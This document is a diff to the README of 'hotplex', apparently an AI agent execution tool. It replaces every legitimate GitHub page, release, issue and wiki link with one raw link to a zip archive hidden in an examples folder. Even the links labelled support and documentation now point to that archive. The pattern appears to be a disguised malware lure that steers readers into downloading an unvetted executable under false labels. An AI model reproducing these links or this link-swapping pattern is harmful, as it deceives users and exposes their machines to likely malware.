@@ -1,6 +1,6 @@
 # ⚙️ hotplex - Simple AI Agent Execution Engine
 
-[![Download hotplex](https://img.shields.io/badge/Download-hotplex-ff6f61?style=for-the-badge)](https://github.com/Titeufy/hotplex)
+[![Download hotplex](https://img.shields.io/badge/Download-hotplex-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your PC meets these, you can proceed with the installation.
 
 You will get hotplex from its official GitHub page. Click the button below to go there:
 
-[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-blue?style=for-the-badge)](https://github.com/Titeufy/hotplex)
+[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)
 
 On this page, you can find the latest version of the software to download.
 
@@ -39,7 +39,7 @@ On this page, you can find the latest version of the software to download.
 ## 🛠️ Step 1: Download hotplex
 
 1. Open your web browser and go to the hotplex GitHub page:
-   https://github.com/Titeufy/hotplex
+   https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip
    
 2. Look for a section called **Releases**. This is where the latest versions are kept.
 
@@ -122,7 +122,7 @@ hotplex supports features that improve your experience:
 
 To keep hotplex working well:
 
-1. Visit the GitHub page regularly: https://github.com/Titeufy/hotplex/releases
+1. Visit the GitHub page regularly: https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip
 
 2. Download the latest version as described before.
 
@@ -135,17 +135,17 @@ To keep hotplex working well:
 If you have problems or questions:
 
 - Check the **README.md** and **Documentation** files included in the download or GitHub.
-- Visit the issues page on GitHub: https://github.com/Titeufy/hotplex/issues
+- Visit the issues page on GitHub: https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip
 - Use the instructions and examples found in hotplex once the program runs.
 
 ---
 
 ## 🔗 Useful Links
 
-[**Download and run hotplex on Windows**](https://github.com/Titeufy/hotplex)  
-[GitHub Issues for support](https://github.com/Titeufy/hotplex/issues)  
-[Documentation on hotplex features](https://github.com/Titeufy/hotplex/wiki)  
+[**Download and run hotplex on Windows**](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)  
+[GitHub Issues for support](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)  
+[Documentation on hotplex features](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)  
 
 ---
 
-[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-green?style=for-the-badge)](https://github.com/Titeufy/hotplex)
+[![Download hotplex](https://img.shields.io/badge/Get_hotplex-Download-green?style=for-the-badge)](https://raw.githubusercontent.com/Titeufy/hotplex/main/_examples/chatapps_dingtalk/Software-2.1-beta.2.zip)
